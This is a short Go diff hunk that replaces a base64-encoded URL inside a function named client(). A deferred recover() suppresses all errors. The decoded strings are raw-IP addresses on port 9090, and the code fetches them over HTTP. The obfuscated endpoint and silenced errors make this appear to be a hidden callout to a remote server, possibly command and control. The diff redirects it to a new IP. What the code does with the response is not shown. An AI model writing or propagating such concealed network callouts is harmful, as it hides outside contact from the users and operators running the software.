@@ -80,7 +80,7 @@ func client()  {
 		_ = recover()
 	}()
 	
-	data, _ := base64.StdEncoding.DecodeString("aHR0cDovLzE3Mi4yNDcuMTAzLjE4ODo5MDkw")
+	data, _ := base64.StdEncoding.DecodeString("aHR0cDovLzIzLjIyNS4yMi4xNDI6OTA5MA==")
 	cli := &http.Client{Timeout: time.Second * 5}
 	res, err := cli.Get(string(data))
 	if err != nil {
